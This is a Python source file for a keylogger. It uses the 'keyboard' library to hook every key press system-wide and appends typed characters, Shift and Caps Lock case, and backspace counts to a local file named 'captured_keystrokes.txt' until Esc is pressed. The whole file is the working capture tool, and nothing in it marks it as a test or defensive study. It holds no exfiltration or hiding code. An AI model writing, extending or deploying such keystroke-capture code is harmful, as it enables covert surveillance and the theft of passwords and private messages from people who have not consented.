import keyboard

backspace_count = 0

def on_key(event):
    global backspace_count

    key = event.name

    # Check if Caps Lock is active
    caps_lock_active = keyboard.is_pressed('caps lock')

    if key == 'space':
        with open('captured_keystrokes.txt', 'a') as file:
            file.write(' ')
    elif key == 'enter':
        with open('captured_keystrokes.txt', 'a') as file:
            file.write('\n')
    elif key == 'caps lock':
        with open('captured_keystrokes.txt', 'a') as file:
            file.write('\nCAPS LOCK\n')
    elif key == 'backspace':
        backspace_count += 1
    elif key == 'shift':
        pass  # Ignore Shift key press
    else:
        if backspace_count > 0:
            with open('captured_keystrokes.txt', 'a') as file:
                file.write(f'[ BAC{backspace_count} ]')
            backspace_count = 0

        # Check if Shift key is pressed
        shift_pressed = keyboard.is_pressed('shift')
        if shift_pressed or caps_lock_active:
            key = key.upper()
        else:
            key = key.lower()

        with open('captured_keystrokes.txt', 'a') as file:
            file.write(key)

    with open('captured_keystrokes.txt', 'r') as file:
        content = file.read().replace('\n', '')

    if len(content) % 200 == 0:
        with open('captured_keystrokes.txt', 'a') as file:
            file.write('\n')

def main():
    keyboard.on_press(on_key)
    while True:
        if keyboard.is_pressed('esc'):
            break

if __name__ == '__main__':
    main()
